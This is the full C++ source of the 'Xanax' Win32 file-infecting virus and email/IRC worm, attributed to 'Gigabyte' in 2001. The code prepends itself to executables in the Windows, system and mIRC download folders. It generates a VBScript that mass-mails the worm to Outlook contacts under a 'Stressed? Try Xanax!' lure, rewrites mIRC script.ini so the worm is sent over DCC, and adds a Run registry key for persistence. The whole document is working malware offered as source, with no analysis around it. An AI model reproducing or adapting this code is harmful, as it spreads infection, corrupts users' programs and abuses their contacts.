   /*
           Virus Name: Xanax
           Version: A
           Type: Win32 EXE Prepender / I-Worm
           Author: Gigabyte
           Homepage: http://www.coderz.net/gigabyte
   */

   #include <iostream>
   #include <windows.h>
   #include <direct.h>

   using namespace std;

   char hostfile[MAX_PATH], CopyHost[MAX_PATH], Virus[MAX_PATH];
   char Buffer[MAX_PATH], checksum[2], Xanax[MAX_PATH], XanStart[MAX_PATH];
   char mark[2], CopyName[10], FullPath[MAX_PATH], VersionBat[15],vnumber[11];
   char WinScript[MAX_PATH], DirToInfect[MAX_PATH], RepairHost[MAX_PATH];
   FILE *vfile;

   void VirCheck(char SRCFileName[])
   {
       FILE *SRC;
       char Buffer[1];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {

               for (v = 0; v < 19; v ++)
               {
                   Counter = fread(Buffer, 1, 1, SRC);
               }

               strcpy(checksum, Buffer);

               for (v = 0; v < 1; v ++)
               {
                   Counter = fread(Buffer, 1, 1, SRC);
               }

               strcat(checksum, Buffer);
           }
       fclose(SRC);
   }

   void WriteVirus(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "wb");
           if(DST)
           {
               for (v = 0; v < 33; v ++)
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   void AddOrig(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "ab");
           if(DST)
           {
               while(! feof(SRC))
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }

   void CopyOrig(char SRCFileName[], char DSTFileName[])
   {
       FILE *SRC, *DST;
       char Buffer[1024];
       short Counter = 0;
       int v = 0;
       SRC = fopen(SRCFileName, "rb");
       if(SRC)
       {
           DST = fopen(DSTFileName, "wb");
           if(DST)
           {
               for (v = 0; v < 33; v ++)
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 0, 0, DST);
               }

               while(! feof(SRC))
               {
                   Counter = fread(Buffer, 1, 1024, SRC);
                   if(Counter)
                   fwrite(Buffer, 1, Counter, DST);
               }
           }
       }
       fclose(SRC);
       fclose(DST);
   }


   bool FileExists(char *FileName)
   {
       HANDLE Exists;
       Exists = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
       if(Exists == INVALID_HANDLE_VALUE)
       return false;
       CloseHandle(Exists);
       return true;
   }

   void ScriptFile()
   {
       GetWindowsDirectory(Buffer,MAX_PATH);
       fprintf(vfile,"[script]\nn0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\nn1=/dcc send $nick");
       fprintf(vfile," %s%csystem%c%s\nn2=}\n", Buffer, 92, 92, CopyName);
   }

   void main(int argc, char **argv)
   {
       strcpy(Virus, argv[0]);
       GetWindowsDirectory(Buffer,MAX_PATH);

       char * regkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" + NULL;
       strcpy(Xanax,Buffer);
       strcat(Xanax,"\\system\\xanax.exe");
       strcpy(XanStart,Buffer);
       strcat(XanStart,"\\system\\xanstart.exe");

       char * regdata = XanStart + NULL;

       strcpy(CopyName, "xanax.exe");
       strcpy(FullPath, Buffer);
       strcat(FullPath, "\\system\\");
       strcat(FullPath, CopyName);

       WriteVirus(Virus, FullPath);

       int x = lstrlen(Virus) - 6;
       if(Virus[x] != 'r')
       {
           if(Virus[x] != 'R')
               CopyFile(Xanax,XanStart,FALSE);
           else
           MessageBox(NULL,"8-Chloro-1-methyl-6-phenyl-4H-s-triazolo (4,3-alpha)(1,4) benzodiazepine","Xanax",MB_OK);
       }
       else
           MessageBox(NULL,"8-Chloro-1-methyl-6-phenyl-4H-s-triazolo (4,3-alpha)(1,4) benzodiazepine","Xanax",MB_OK);


       strcpy(WinScript, Buffer);
       strcat(WinScript, "\\wscript.exe");

       if(FileExists(WinScript))
       {
           if(FileExists("xanax.sys") == false)
           {
               vfile = fopen("c:\\xanax.vbs","wt");
               if(vfile)
               {
                   fprintf(vfile,"On Error Resume Next\n");
                   fprintf(vfile,"Dim xanax, Mail, Counter, A, B, C, D, E, F\n");
                   fprintf(vfile,"Set xanax = CreateObject(%coutlook.application%c)\n", 34, 34);
                   fprintf(vfile,"Set Mail = xanax.GetNameSpace(%cMAPI%c)\n", 34, 34);
                   fprintf(vfile,"For A = 1 To Mail.AddressLists.Count\n");
                   fprintf(vfile,"Set B = Mail.AddressLists(A)\n");
                   fprintf(vfile,"Counter = 1\n");
                   fprintf(vfile,"Set C = xanax.CreateItem(0)\n");
                   fprintf(vfile,"For D = 1 To B.AddressEntries.Count\n");
                   fprintf(vfile,"E = B.AddressEntries(Counter)\n");
                   fprintf(vfile,"C.Recipients.Add E\n");
                   fprintf(vfile,"Counter = Counter + 1\n");
                   fprintf(vfile,"If Counter > 1000 Then Exit For\n");
                   fprintf(vfile,"Next\n");
                   fprintf(vfile,"C.Subject = %cStressed? Try Xanax!%c\n", 34, 34);
                   fprintf(vfile,"C.Body = %cHi there! Are you so stressed that it makes you ill? You're not alone! Many people suffer from stress, these days. ",34);
                   fprintf(vfile,"Maybe you find Prozac too strong? Then you NEED to try Xanax, it's milder. ");
                   fprintf(vfile,"Still not convinced? Check out the medical details in the attached file. Xanax might change your life!%c\n",34);
                   fprintf(vfile,"C.Attachments.Add %c%s%csystem%c%s%c\n", 34, Buffer, 92, 92, CopyName, 34);
                   fprintf(vfile,"C.DeleteAfterSubmit = True\n");
                   fprintf(vfile,"C.Send\n");
                   fprintf(vfile,"E = %c%c\n", 34, 34);
                   fprintf(vfile,"Next\n");
                   fprintf(vfile,"Set F = CreateObject(%cScripting.FileSystemObject%c)\n", 34, 34);
                   fprintf(vfile,"F.DeleteFile Wscript.ScriptFullName\n");
                   fclose(vfile);
               }
               ShellExecute(NULL, "open", "xanax.vbs", NULL, NULL, SW_SHOWNORMAL);
           }
       }


       _chdir(Buffer);
       if(FileExists("Expostrt.exe") == false)
       {
       WIN32_FIND_DATA FindData;
       HANDLE FoundFile;

       strcat(DirToInfect, Buffer);
       strcat(DirToInfect, "\\*.exe");
       FoundFile = FindFirstFile(DirToInfect, &FindData);

     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
           if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
           {
           }

     else
     {
       GetWindowsDirectory(Buffer,MAX_PATH);
       _chdir(Buffer);
       _chdir("system");

       strcpy(hostfile, Buffer);
       strcat(hostfile, "\\");
       strcat(hostfile, FindData.cFileName);

       VirCheck(hostfile);

       strcpy(mark,"ny");

       if(FindData.cFileName[3] != 'D')
       {
       if(FindData.cFileName[0] != 'P')
       {
       if(FindData.cFileName[0] != 'R')
       {
       if(FindData.cFileName[0] != 'E')
       {
       if(FindData.cFileName[0] != 'T')
       {
       if(FindData.cFileName[0] != 'W')
       {
       if(FindData.cFileName[0] != 'w')
       {
       if(FindData.cFileName[5] != 'R')
       {
       if(FindData.cFileName[0] != 'S')
       {
       if(FindData.cFileName[0] != 's')
       {
       if(checksum[1] != mark[1])
       {
       strcpy(CopyHost, "host.tmp");
       CopyFile(hostfile, CopyHost, FALSE);

       strcpy(Virus, argv[0]);
       CopyFile(FullPath, hostfile, FALSE);
       AddOrig(CopyHost, hostfile);
       _unlink("host.tmp");
       }}}}}}}}}}}

     }
        }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }

     if(FileExists("c:\\mirc\\mirc32.exe"))
     {
     FoundFile = FindFirstFile("c:\\mirc\\download\\*.exe", &FindData);

     if(FoundFile != INVALID_HANDLE_VALUE)
     {
         do
        {
           if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
           {
           }

     else
     {
       _chdir(Buffer);
       _chdir("system");

       strcpy(hostfile, "c:\\mirc\\download\\");
       strcat(hostfile, FindData.cFileName );

       VirCheck(hostfile);

       strcpy(mark,"ny");

       if(checksum[1] != mark[1])
       {
       strcpy(CopyHost, "host.tmp");
       CopyFile(hostfile, CopyHost, FALSE);

       WriteVirus(Virus, hostfile);
       AddOrig(CopyHost, hostfile);
       _unlink("host.tmp");
       }
     }
        }
        while (FindNextFile(FoundFile, &FindData));
        FindClose(FoundFile);
     }
     }

       vfile = fopen("c:\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("c:\\PROGRA~1\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("d:\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("d:\\PROGRA~1\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("e:\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("e:\\PROGRA~1\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("f:\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }
       vfile = fopen("f:\\PROGRA~1\\mirc\\script.ini","wt");
       if(vfile)
       {
       ScriptFile();
       fclose(vfile);
       }

       _chdir(Buffer);
       vfile = fopen("winstart.bat","wt");
       if(vfile)
       {
       fprintf(vfile,"@cls\n");
       fprintf(vfile,"@echo Do not take this medication with ethanol, Buspar (buspirone), TCA\n");
       fprintf(vfile,"@echo antidepressants, narcotics, or other CNS depressants.\n");
       fprintf(vfile,"@echo This combination can increase CNS depression. Be sure not to take other\n");
       fprintf(vfile,"@echo sedative, benzodiazepines, or sleeping pills with this drug. The combinations\n");
       fprintf(vfile,"@echo could be fatal. Do not smoke or drink alcohol when taking Xanax. Alcohol can\n");
       fprintf(vfile,"@echo lower blood pressure and decrease your breathing rate to the point of\n");
       fprintf(vfile,"@echo unconsciousness. Tobacco and marijuana smoking can add to the sedative\n");
       fprintf(vfile,"@echo effects of Xanax.\n");
       fclose(vfile);
       }

       vfile = fopen("xanax.sys", "wt");
       if(vfile)
       {
           fprintf(vfile, "Win32.HLLP.Xanax (c) 2001 Gigabyte\n");
           fclose(vfile);
       }


       RegSetValue(HKEY_LOCAL_MACHINE, regkey, REG_SZ, regdata, lstrlen(regdata));

       strcpy(RepairHost, Buffer);
       strcat(RepairHost, "\\system\\hostfile.exe");
       CopyOrig(Virus, RepairHost);
       _chdir("system");
       if(FileExists(RepairHost))
       WinExec(RepairHost, SW_SHOWNORMAL);
       _unlink("hostfile.exe");
     }
   }
